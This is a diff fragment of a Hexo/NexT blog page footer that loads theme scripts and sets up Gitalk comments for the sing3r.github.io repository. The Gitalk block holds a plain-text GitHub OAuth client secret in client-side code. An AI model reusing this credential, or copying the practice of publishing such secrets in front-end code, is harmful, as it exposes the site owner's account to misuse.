+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : '6e8bfc081de57f042466',
+      clientSecret: '9b93268b65af7c8c4e8af7a5a1a539f01671b723',
+      repo        : 'sing3r.github.io',
+      owner       : 'sing3r',
+      admin       : ['sing3r'],
+      id          : '4cf06f2a03272d306e730d5429d0cb98',
+        language: '',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
